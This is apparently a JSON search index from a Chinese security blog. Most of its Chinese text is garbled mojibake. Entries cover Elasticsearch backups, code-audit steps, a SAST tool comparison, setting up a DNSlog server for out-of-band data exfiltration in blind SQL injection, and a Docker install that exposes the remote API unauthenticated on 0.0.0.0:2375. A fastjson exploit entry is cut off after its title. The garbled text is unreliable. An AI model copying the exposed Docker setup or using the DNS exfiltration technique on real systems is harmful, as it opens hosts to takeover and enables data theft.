\u0026#34;indices\u0026#34;: [\u0026#34;*\u0026#34;] }, \u0026#34;retention\u0026#34;: { \u0026#34;expire_after\u0026#34;: \u0026#34;30d\u0026#34;, \u0026#34;min_count\u0026#34;: 5, \u0026#34;max_count\u0026#34;: 50 } } \u0026#39; # è§¦å‘è‡ªåŠ¨å¤‡ä»½ curl -X POST \u0026#34;http://127.0.0.1:9200/_slm/policy/everyday-snapshots/_execute?pretty\u0026#34; # æŸ¥çœ‹æ‰§è¡Œç»“æœ curl -X GET \u0026#34;http://127.0.0.1:9200/_slm/policy/everyday-snapshots?human\u0026amp;pretty\u0026#34;   æ¢å¤å¤‡ä»½  1 2 3 4 5 6 7 8 9  curl -H \u0026#39;Content-Type: application/json\u0026#39; -X POST \u0026#34;http://127.0.0.1:9200/_snapshot/my_backup/snapshot_1/_restore\u0026#34; -d\u0026#39; { \u0026#34;indices\u0026#34;: \u0026#34;index_1,index_2\u0026#34;, \u0026#34;ignore_unavailable\u0026#34;: true, \u0026#34;include_global_state\u0026#34;: true, \u0026#34;rename_pattern\u0026#34;: \u0026#34;index_(.+)\u0026#34;, \u0026#34;rename_replacement\u0026#34;: \u0026#34;restored_index_$1\u0026#34; } \u0026#39;   ","description":"","id":2,"section":"dso","tags":null,"title":"OpenRASPéƒ¨ç½²è®°å½•","uri":"http://crkmythical.github.io/dso/openrasp%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/"},{"content":"Markdown here\n","description":"test post","id":4,"section":"red","tags":null,"title":"February 2019","uri":"http://crkmythical.github.io/red/2019_february/"},{"content":"Markdown here\n","description":"test post","id":5,"section":"red","tags":null,"title":"March 2019","uri":"http://crkmythical.github.io/red/2019_march/"},{"content":"Markdown here\n","description":"test post","id":6,"section":"red","tags":null,"title":"April 2019","uri":"http://crkmythical.github.io/red/2019_april/"},{"content":"Markdown here\n","description":"test post","id":7,"section":"red","tags":null,"title":"May 2019","uri":"http://crkmythical.github.io/red/2019_may/"},{"content":" halo  sdfsf\n sdfasfsa\n  ","description":"","id":8,"section":"red","tags":null,"title":"Linux","uri":"http://crkmythical.github.io/red/linux/"},{"content":"Table of Contents  ä»£ç å®¡è®¡å¸¸è§„æ‰‹æ³•  Front Back å®¡è®¡æµç¨‹å››æ­¥éª¤  Front Back      \nä»£ç å®¡è®¡å¸¸è§„æ‰‹æ³• \nFront ä»£ç å®¡è®¡å¸¸è§„æ‰‹æ³•\n\nBack  é€šè¯»æºç : ä»å…¥å£å‡½æ•°å¼€å§‹è¯» å…³é”®å‡½æ•°å›æº¯: å…ˆå®šä½æ•æ„Ÿå‡½æ•°åŠå‚æ•°,åŒæ­¥å›æº¯å‚æ•°èµ‹å€¼è¿‡ç¨‹,åˆ¤æ–­æ˜¯å¦å¯æ§ä»¥åŠæ˜¯å¦ç»è¿‡è¿‡æ»¤ç­‰ è¿½è¸ªåŠŸèƒ½ç‚¹: æ ¹æ®ç»éªŒåˆ¤æ–­å¯èƒ½å­˜åœ¨é—®é¢˜çš„è·¯ç”±æˆ–åŠŸèƒ½ç‚¹,å¯¹è¯¥åŠŸèƒ½ç‚¹è¿›è¡Œé€šè¯»  \nå®¡è®¡æµç¨‹å››æ­¥éª¤ \nFront å®¡è®¡æµç¨‹å››æ­¥éª¤\n\nBack  1.è·å–æºç ,æ­å»ºç¯å¢ƒ: Githubã€GitLabã€CSDNã€Giteeç­‰ 2.åŠè‡ªåŠ¨åŒ–ä»£ç å®¡è®¡: SASTå·¥å…·æ‰«æ,åŠŸèƒ½ç‚¹å®¡è®¡ã€å…³é”®å‡½æ•°æº¯æºã€é€šè¯»æºç  3.POCç¼–å†™: æ ¹æ®å®¡è®¡ç»“æœä»¥åŠè§¦å‘æ–¹å¼ç¼–å†™POC,é€šè¿‡POCç¡®å®šé—®é¢˜åŠé€ æˆå½±å“ 4.æŠ¥å‘Šç¼–å†™: æ ¹æ®å®¡è®¡å‡ºçš„å®‰å…¨é—®é¢˜å’ŒPOCè„šæœ¬çš„éªŒè¯ç»“æœ,ç¼–å†™æ•´ä½“çš„ä»£ç å®¡è®¡æŠ¥å‘Š  ","description":"","id":9,"section":"dso","tags":[""],"title":"Devsecopsæ˜¯ä»€ä¹ˆ","uri":"http://crkmythical.github.io/dso/devsecops%E6%98%AF%E4%BB%80%E4%B9%88/"},{"content":"ç¼–å†™è¿›åº¦\n   linuxå¦‚ä½•æ·»åŠ è‡ªå®šä¹‰æœåŠ¡-serviceå‘½ä»¤ æ·»åŠ é…ç½® 1 2 3 4 5 6 7 8 9 10 11 12 13 14  cat \u0026lt;\u0026lt;EOF \u0026gt;/etc/systemd/system/clash.service [Unit] Description=Clash service After=network.target [Service] Type=simple User=skylee ExecStart=/usr/bin/clash Restart=on-failure RestartPreventExitStatus=23 [Install] WantedBy=multi-user.target   æœåŠ¡æ“ä½œ 1 2 3  systemctl list-units --type=service # æŸ¥çœ‹å·²è¯†åˆ«çš„æœåŠ¡ systemctl daemon-reload # è®©ç³»ç»Ÿé‡æ–°è¯»å–æœåŠ¡ service \u0026lt;service-name\u0026gt; start/restart/stop   å¯/ç¦ç”¨å¼€æœºè‡ªå¯ 1  systemctl enable/disable \u0026lt;service-name\u0026gt;   ","description":"","id":10,"section":"blog","tags":null,"title":"linuxå¦‚ä½•æ·»åŠ è‡ªå®šä¹‰æœåŠ¡","uri":"http://crkmythical.github.io/blog/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1/"},{"content":"Markdown here\n","description":"test post","id":11,"section":"dso","tags":null,"title":"Related content","uri":"http://crkmythical.github.io/dso/relatedcontent/"},{"content":"Markdown here\n","description":"test post","id":12,"section":"dso","tags":null,"title":"Page Resources","uri":"http://crkmythical.github.io/dso/pageresources/"},{"content":"Markdown here\n","description":"test post","id":13,"section":"dso","tags":null,"title":"Shortcodes","uri":"http://crkmythical.github.io/dso/contentmanagement/shortcodes/"},{"content":"Markdown here\n","description":"test post","id":14,"section":"dso","tags":null,"title":"Frontmatter","uri":"http://crkmythical.github.io/dso/contentmanagement/frontmatter/"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;â€”\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\nâ€” Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    InlineÂ  MarkdownÂ  InÂ  Table     italics bold strikethroughÂ  code    Code Blocks Code block with backticks html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements â€” abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"Sample article showcasing basic Markdown syntax and formatting for HTML elements.","id":15,"section":"dso","tags":["markdown","css","html","themes"],"title":"Section","uri":"http://crkmythical.github.io/dso/contentmanagement/sections/"},{"content":"1. èƒŒæ™¯ æºä»£ç é™æ€åˆ†æå·¥å…·ï¼ˆSASTï¼‰ä½œä¸ºè½¯ä»¶å®‰å…¨çš„é‡è¦ä¿éšœå·¥å…·ï¼Œå·²ç»åœ¨å„ä¸ªé¢†åŸŸè¢«å¹¿æ³›ä½¿ç”¨ã€‚éšç€å¼€æºSASTå·¥å…·çš„å¹¿æ³›ä½¿ç”¨ï¼Œå·¥å…·ç§ç±»çš„å¢åŠ ï¼Œä½¿ç”¨è€…å¾ˆéš¾åˆ¤æ–­å·¥å…·çš„ä¼˜åŠ£åŠé€‚ä¸é€‚åˆä¼ä¸šçš„åº”ç”¨åœºæ™¯ï¼Œæ•…æ­¤æ¬¡å¯¹é™æ€ä»£ç åˆ†æå·¥å…·è¿›è¡Œä¸€æ¬¡æµ‹è¯„å’Œè°ƒç ”ï¼Œä¸ºå…¬å¸é€‰æ‹©é™æ€ä»£ç åˆ†æå·¥å…·æä¾›ä¾æ®ã€‚\n2. ç°çŠ¶ äº§å“è¿­ä»£é€Ÿåº¦è¶Šæ¥è¶Šå¿«ï¼Œæ¯ä¸ªåˆ†æ”¯éƒ½æœ‰å„è‡ªçš„ä¸šåŠ¡èŒƒå›´å’Œå¼€å‘å‘¨æœŸéœ€æ±‚ï¼Œç›®å‰å®‰å…¨æ£€æµ‹ä¸»è¦é›†ä¸­åœ¨æµ‹è¯•é˜¶æ®µï¼Œå¯¹å¼€å‘è¿‡ç¨‹ä¸­çš„ä»£ç è´¨é‡å’Œä»£ç å®‰å…¨æ€§æ²¡æœ‰ç›‘æ§ï¼Œæƒ³ä»æºå¤´ä¸Šæ²»ç†æ¼æ´å°±éœ€è¦åˆ¶å®šä»£ç æ£€æµ‹æœºåˆ¶ï¼ŒSASTæ˜¯ä¸€ç§åœ¨å¼€å‘é˜¶æ®µå¯¹æºä»£ç è¿›è¡Œå®‰å…¨æµ‹è¯•å‘ç°å®‰å…¨æ¼æ´çš„æµ‹è¯•æ–¹æ¡ˆã€‚èƒ½å¤Ÿæ›´æå‰çš„å‘ç°æ¼æ´ï¼Œæœ‰æ•ˆçš„å‡å°‘å®‰å…¨é£é™©ã€‚\n3. äº§å“é€‰å‹ æœ¬æ¬¡é¶åœºé€‰æ‹©Â OWASP BenchmarkÂ é¶åœºã€‚OWASP Benchmark æ˜¯ä¸€ä¸ªJavaè¯­è¨€ä¸”åå®‰å…¨çš„å›½é™…é€šç”¨æµ‹è¯•é›†ï¼Œæ—¨åœ¨è¯„ä¼°å®‰å…¨æµ‹è¯•å·¥å…·çš„èƒ½åŠ›ï¼ˆå‡†ç¡®ç‡ã€è¦†ç›–åº¦ã€æ‰«æé€Ÿåº¦ç­‰ç­‰ï¼‰ï¼Œä»è€Œæ›´å¥½å¾—æ¯”è¾ƒå„ä¸ªå®‰å…¨å·¥å…·çš„ä¼˜ç¼ºç‚¹ã€‚\n3.1 æµ‹è¯•ä¾æ® ä¸€èˆ¬æ¥è¯´ï¼Œè¯¯æŠ¥å’Œæ¼æŠ¥ç‡æ˜¯SASTæœ€é‡è¦çš„æŠ€æœ¯è¯„ä»·æŒ‡æ ‡ï¼ŒOWASPåŸºå‡†æµ‹è¯•æ˜¯ä¸€ä¸ªç¤ºä¾‹åº”ç”¨ç¨‹åºï¼Œå…¶ä¸­åŒ…å«æ¥è‡ª11ä¸ªç±»åˆ«çš„æ•°åƒä¸ªæ¼æ´ã€‚åŸºå‡†æµ‹è¯•ä¸­åŒ…æ‹¬å¾ˆéš¾é€šè¿‡é™æ€åˆ†æå¤„ç†çš„ä»£ç ç‰‡æ®µï¼Œä¾‹å¦‚ï¼šé—´æ¥è°ƒç”¨ã€ä¸å¯è¾¾åˆ†æ”¯ã€æ˜ å°„ã€ä¾èµ–äºé…ç½®æ–‡ä»¶çš„å€¼ã€‚ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šååº”ä»£ç åˆ†æå·¥å…·çš„æ£€æµ‹èƒ½åŠ›ï¼Œæ‰€ä»¥è¯„ä»·ä¸€æ¬¾é™æ€ç¼ºé™·æ£€æµ‹å·¥å…·çš„è¯ï¼Œæœ€å¥½é€šè¿‡å›½é™…ä¸Šè®¤å¯çš„æ ‡å‡†æ¡ˆä¾‹é›†è¿›è¡ŒéªŒè¯\nç›®å‰ V1.2 ç‰ˆæœ¬åŒ…å«äº†2740ä¸ªæ¼æ´ï¼Œè¦†ç›–å¸¸è§çš„SQLæ³¨å…¥ã€å‘½ä»¤æ³¨å…¥ã€è·¯å¾„éå†ã€XSSï¼Œä»¥åŠä¼—å¤šå®‰å…¨ç¼–ç ç±»çš„é—®é¢˜ï¼Œå…¶ä¸­æœ‰1415ä¸ªçœŸå®æ¼æ´ï¼Œ1325ä¸ªå‡æ¼æ´ã€‚\nç”¨ä¾‹ä¸‹è½½åœ°å€ï¼šBenchmarkJava\n3.2 è¯„åˆ†æ ‡å‡† å¯¹äºæµ‹è¯•å·¥å…·æ¥è¯´ï¼Œæˆ‘ä»¬æœŸæœ›ä»–èƒ½å¤Ÿ\n å‘ç°æ‰€æœ‰çš„çœŸæ­£æ˜¯é—®é¢˜çš„æ¼æ´ å³ True Positiveï¼ŒTPæŒ‡æ•°ï¼Œæ£€å‡ºç‡å°½å¯èƒ½é«˜ èƒ½å¤Ÿå¿½ç•¥æ‰€æœ‰éé—®é¢˜çš„æ¼æ´ å³False Positiveï¼ŒFPæŒ‡æ•°ï¼Œè¯¯æŠ¥ç‡å°½å¯èƒ½ä½  Benchmark å°†ä»¥TP,FPä¸ºåæ ‡è½´ç»˜åˆ¶ä¸€å¼ å›¾ï¼Œå½“ç‚¹è¶Šé è¿‘å·¦ä¸Šæ–¹æ—¶ï¼Œè®¤ä¸ºæµ‹è¯•åŠŸèƒ½èƒ½åŠ›æ›´ä¼˜ã€‚\n![[Pasted image 20220621134021.png]]\nä¸€èˆ¬å®‰å…¨æ£€æŸ¥å·¥å…·ä¼šæ£€æµ‹å‡ºå¤§é‡çš„æ¼æ´ï¼Œä½†æ˜¯å…¶ä¸­æœ‰å¾ˆå¤šéƒ½æ˜¯è¯¯æŠ¥çš„ã€‚ä¸ºäº†å¾—åˆ°æ‰€æµ‹è¯•çš„åº”ç”¨ç¨‹åºçš„å‡†ç¡®ç¨‹åº¦ï¼Œbenchmarkè®¾ç½®äº†å››ç§ä¸“é—¨çš„æµ‹è¯•ç»“æœï¼š\n å·¥å…·æ­£ç¡®è¯†åˆ«äº†çœŸå®æ¼æ´ï¼ˆTrue Positiveï¼ŒTPï¼‰ï¼› å·¥å…·æ²¡æœ‰è¯†åˆ«å‡ºçœŸå®æ¼æ´ï¼ˆFalse Negativeï¼ŒFNï¼‰ï¼› å·¥å…·æ²¡æœ‰å¯¹å‡çš„æ¼æ´è¿›è¡Œè¯¯æŠ¥ï¼ˆTrue Negativeï¼ŒTNï¼‰ï¼› å·¥å…·å¯¹å‡çš„æ¼æ´è¿›è¡Œè¯¯æŠ¥ï¼ˆFalse Positiveï¼ŒFPï¼‰ï¼›  Benchmarkæœ€åå¾—åˆ†å‚è€ƒçº¦ç™»æŒ‡æ•°ç»™å‡ºï¼Œæ»¡åˆ†æ˜¯1.0åˆ†ã€‚ç”¨ä»¥ä¸‹å…¬å¼è®¡ç®—åˆ†å€¼ï¼Œ==å¾—åˆ†è¶Šé è¿‘Â 1 è¡¨æ˜æµ‹è¯•å·¥å…·èƒ½åŠ›è¶Šå¼º==\nçº¦ç™»æŒ‡æ•°è®¡ç®—æ–¹æ³•ä¸º\n(sensitivity + specificity) â€“ 1 å…¶ä¸­\nSensitivity = TPR=TP/ï¼ˆTP+FNï¼‰ Specificity = 1-FPR=TN/ï¼ˆTN+FPï¼‰ Youden Index= (sensitivity + specificity) â€“ 1 = (TPR+1-FPR)-1 = TPR-FPR 3.3 äº§å“å¯¹æ¯”    äº§å“å æ£€å‡ºç‡ï¼ˆTPï¼‰ è¯¯æŠ¥ç‡ï¼ˆFPï¼‰ æ¼æŠ¥ç‡ï¼ˆFNï¼‰ æ£€æµ‹é€Ÿåº¦ï¼ˆæ¯å°æ—¶æ£€æµ‹ä»£ç è¡Œæ•°ï¼‰ æ”¯æŒè¯­è¨€ è‡ªå®šä¹‰è§„åˆ™ èƒ½æ¥æ”¶gitlabæ¶ˆæ¯ IDEæ’ä»¶ çº¦ç™»æŒ‡æ•°     Synopsysï¼ˆç¾å›½-æ–°æ€ç§‘æŠ€ï¼‰            CheckMarxï¼ˆä»¥è‰²åˆ—ï¼‰            Veracodeï¼ˆç¾å›½ï¼‰            Fortifyï¼ˆç¾å›½-æƒ æ™®ï¼‰            Snykï¼ˆè‹±å›½ï¼‰            SonarQubeï¼ˆå¼€æºï¼‰            Xcheckï¼ˆå›½äº§-è…¾è®¯ï¼‰            CoBOTï¼ˆå›½äº§-åŒ—å¤§è½¯ä»¶ï¼‰            å¥‡å®‰ä¿¡ä»£ç å«å£«ï¼ˆå›½äº§-å¥‡å®‰ä¿¡ï¼‰            é¸¿æ¸ç§‘æŠ€ï¼ˆå›½äº§-åŒ—äº¬é¸¿æ¸ç§‘æŠ€ï¼‰            WuKong (å›½äº§-åŒ—äº¬ä¸­ç§‘å¤©é½)            DMSCAï¼ˆå›½äº§-åŒ—äº¬ç«¯ç›ç§‘æŠ€ï¼‰             4. ç»“è®º ","description":"","id":16,"section":"dso","tags":null,"title":"","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/attachments/sast-%E6%8A%80%E6%9C%AF%E8%B0%83%E7%A0%94/"},{"content":"Beijing: ğŸŒ« ğŸŒ¡ï¸+25Â°C ğŸŒ¬ï¸â†™7km/h\nDNSlogå›æ˜¾å¹³å° https://github.com/lanyi1998/DNSlog-GO\nDNSlogæ˜¯ä»€ä¹ˆ DNSå°±æ˜¯å°†åŸŸåè§£æä¸ºipï¼Œç”¨æˆ·åœ¨æµè§ˆå™¨ä¸Šè¾“å…¥ä¸€ä¸ªåŸŸåA.comï¼Œå°±è¦é DNSæœåŠ¡å™¨å°†A.comè§£æåˆ°å®ƒçš„çœŸå®ip127.0.0.1ï¼Œè¿™æ ·å°±å¯ä»¥è®¿é—®127.0.0.1æœåŠ¡å™¨ä¸Šçš„ç›¸åº”æœåŠ¡ã€‚ é‚£ä¹ˆDNSlogæ˜¯ä»€ä¹ˆã€‚DNSlogå°±æ˜¯å­˜å‚¨åœ¨DNSæœåŠ¡å™¨ä¸Šçš„åŸŸåä¿¡æ¯ï¼Œå®ƒè®°å½•ç€ç”¨æˆ·å¯¹åŸŸåwww.baidu.comç­‰çš„è®¿é—®ä¿¡æ¯ï¼Œç±»ä¼¼æ—¥å¿—æ–‡ä»¶ã€‚\nDNSlogå›æ˜¾åŸç† DNSæŸ¥è¯¢è¿‡ç¨‹\nåŸç†ä¸Šåªè¦èƒ½è¿›è¡ŒDNSè¯·æ±‚çš„å‡½æ•°éƒ½å¯èƒ½å­˜åœ¨DNSlogæ³¨å…¥ã€‚\n ä½¿ç”¨DNSLogè¿›è¡Œç›²æ‰“  ä¸ºä»€ä¹ˆDNSlogæ³¨å…¥åªèƒ½ç”¨äºwindowsç³»ç»Ÿï¼Ÿ load_file()å‡½æ•°åœ¨Linuxä¸‹æ˜¯æ— æ³•ç”¨æ¥åšDNSLogæ”»å‡»çš„ï¼Œå› ä¸ºlinuxæ²¡æœ‰UNCè¿™ä¸ªä¸œè¥¿ï¼Œæ‰€ä»¥å½“MySQLå¤„äºLinuxç³»ç»Ÿä¸­çš„æ—¶å€™ï¼Œæ˜¯ä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼å¤–å¸¦æ•°æ®çš„ã€‚\nä»€ä¹ˆæ˜¯UNCï¼Ÿ UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨ã€‚ UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚æˆ‘ä»¬æ—¥å¸¸å¸¸ç”¨çš„ç½‘ç»œå…±äº«æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ–¹å¼ã€‚ UNCè·¯å¾„å°±æ˜¯ç±»ä¼¼softerè¿™æ ·çš„å½¢å¼çš„ç½‘ç»œè·¯å¾„ã€‚å®ƒç¬¦åˆ servernamesharename æ ¼å¼ï¼Œå…¶ä¸­ servername æ˜¯æœåŠ¡å™¨åï¼Œsharename æ˜¯å…±äº«èµ„æºçš„åç§°ã€‚ ç›®å½•æˆ–æ–‡ä»¶çš„ UNC åç§°å¯ä»¥åŒ…æ‹¬å…±äº«åç§°ä¸‹çš„ç›®å½•è·¯å¾„ï¼Œæ ¼å¼ä¸ºï¼šservernamesharenamedirectoryfilenameã€‚ ä¾‹å¦‚æŠŠè‡ªå·±ç”µè„‘çš„æ–‡ä»¶å…±äº«ï¼Œä½ ä¼šè·å¾—å¦‚ä¸‹è·¯å¾„ï¼Œè¿™å°±æ˜¯UNCè·¯å¾„ //iZ53sl3r1890u7Z/Users/Administrator/Desktop/111.txt\nå‰æœŸå‡†å¤‡  ä¸€å°VPS ä¸€ä¸ªåŸŸå  é…ç½®NSè®°å½• https://nip.io/\n NIP.IOä½œç”¨\n  å¯¹å¤–å¼€æ”¾UDPåè®®53ç«¯å£ æ­å»ºDNSlog-GO 1  wget https://github.com/lanyi1998/DNSlog-GO/releases/download/1.5.2/DNSlog-GO-linux.zip   ä¿®æ”¹é…ç½®æ–‡ä»¶ config.ini 1 2 3 4 5 6 7  HTTP:port:8000//http webç›‘å¬ç«¯å£#{\u0026#34;token\u0026#34;:\u0026#34;ç”¨æˆ·å¯¹åº”å­åŸŸå\u0026#34;}user:{\u0026#34;admin\u0026#34;: \u0026#34;admin\u0026#34;}//ç”¨æˆ·admin å¯¹åº”çš„dnslogå­åŸŸåæ˜¯ admin.demo.comconsoleDisable:false//æ˜¯å¦å…³é—­webé¡µé¢Dns:domain:demo.com //dnslogåŸŸå  åå°å¯åŠ¨DNSlog-Go 1  nohup ./main \u0026amp;   ","description":"","id":17,"section":"red","tags":["",""],"title":"DNSlogå›æ˜¾å¹³å°","uri":"http://crkmythical.github.io/red/dnslog%E5%9B%9E%E6%98%BE%E5%B9%B3%E5%8F%B0/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+27Â°C ğŸŒ¬ï¸â†–15km/h\nDockeréƒ¨ç½²  å®˜æ–¹æ¨èå®‰è£…æ–¹å¼  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # å¸è½½æ—§ç‰ˆæœ¬ yum remove docker docker-common docker-selinux docker-engine # å®‰è£…æ‰€éœ€è½¯ä»¶åŒ… yum install -y yum-utils device-mapper-persistent-data lvm2 # ä¸­å¤®ä»“åº“ yum-config-manager --add-repo http://download.docker.com/linux/centos/docker-ce.repo # é˜¿é‡Œä»“åº“ yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # æŸ¥çœ‹Dockerå¯ç”¨ç‰ˆæœ¬ yum list docker-ce --showduplicates | sort -r # å®‰è£…docker yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin # å¯åŠ¨å¹¶è®¾ç½®å¼€æœºè‡ªå¯ systemctl enable --now docker # å¼€å¯Dockerè¿œç¨‹è®¿é—® sed -i \u0026#34;s#ExecStart=/usr/bin/dockerd*#ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock#g\u0026#34; /usr/lib/systemd/system/docker.service # é‡å¯Dockerç¯å¢ƒ systemctl daemon-reload \u0026amp;\u0026amp; systemctl restart docker    æç®€å®‰è£…  1  yum install -y docker \u0026amp;\u0026amp; service docker start \u0026amp;\u0026amp; docker -v   å…³äºDocker  imageï¼šé•œåƒï¼Œä¸€ä¸ªæ–‡ä»¶ï¼Œç”¨æ¥åˆ›å»ºå®¹å™¨ï¼›å¦‚æœä½ æœ‰ Windows è£…æœºç»å†ï¼Œé‚£å¯ä»¥å¾ˆå¥½ç†è§£é•œåƒè¿™ä¸ªè¯çš„å«ä¹‰ï¼Œåæ­£æˆ‘å¹´å°‘çš„æ—¶å€™æ²¡å°‘æŠŠ Windows é•œåƒåˆ»ç›˜é‡è£…ç³»ç»Ÿã€‚ containerï¼šå®¹å™¨ï¼Œä¸€ä¸ªå¯è¿è¡Œçš„é•œåƒå®ä¾‹ï¼Œé‡Œé¢è¿è¡Œç€ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œå¯ä»¥åšä¸€åˆ‡ä½ å½“å‰æ“ä½œç³»ç»Ÿå¯ä»¥åšçš„äº‹æƒ…ã€‚ Dockerfileï¼šé•œåƒæ„å»ºçš„æ¨¡æ¿ï¼Œæè¿°é•œåƒæ„å»ºçš„æ­¥éª¤ã€‚  å®ƒä»¬ä¹‹é—´çš„å…³ç³»æ˜¯ï¼Œé€šè¿‡ Dockerfile æ„å»ºå‡ºé•œåƒï¼Œç„¶åé€šè¿‡é•œåƒæ„å»ºå®¹å™¨ï¼Œå®¹å™¨é‡Œå¯ä»¥è·‘ç¨‹åºã€‚å¦å¤–ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥åˆ›å»ºå¤šä¸ªå®¹å™¨ï¼Œæ¯ä¸ªå®¹å™¨ä¹‹é—´æ˜¯ç›¸äº’éš”ç¦»çš„ã€‚\nDocker é‡‡ç”¨çš„æ˜¯ CS æ¶æ„ï¼Œå®¢æˆ·ç«¯ä¸ Docker å®ˆæŠ¤è¿›ç¨‹äº¤äº’ï¼Œåè€…è´Ÿè´£æ„å»ºã€è¿è¡Œå’Œåˆ†å‘ Docker å®¹å™¨çš„å·¥ä½œã€‚\nDocker çš„åº”ç”¨åœºæ™¯éå¸¸ä¸°å¯Œï¼Œæ¯”å¦‚è¯´ï¼š\n è‡ªåŠ¨æ‰“åŒ…å’Œéƒ¨ç½²åº”ç”¨ åˆ›å»ºè½»é‡ã€ç§æœ‰çš„PaaSç¯å¢ƒ è‡ªåŠ¨åŒ–æµ‹è¯•å’ŒæŒç»­é›†æˆ/éƒ¨ç½² éƒ¨ç½²å¹¶æ‰©å±•Webåº”ç”¨ã€æ•°æ®åº“å’Œåç«¯æœåŠ¡å™¨ åˆ›å»ºå®‰å…¨æ²™ç›’ è½»é‡çº§çš„æ¡Œé¢è™šæ‹ŸåŒ–  ","description":"","id":18,"section":"dso","tags":null,"title":"Dockeréƒ¨ç½²","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/centos7%E9%83%A8%E7%BD%B2docker%E6%9C%8D%E5%8A%A1/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+27Â°C ğŸŒ¬ï¸â†–7km/h\nfastjson 1.2.80ç‰ˆæœ¬ååºåˆ—åŒ–æ¼æ´poc fastjsonå·²ä½¿ç”¨é»‘ç™½åå•ç”¨äºé˜²å¾¡ååºåˆ—åŒ–æ¼æ´ï¼Œç»ç 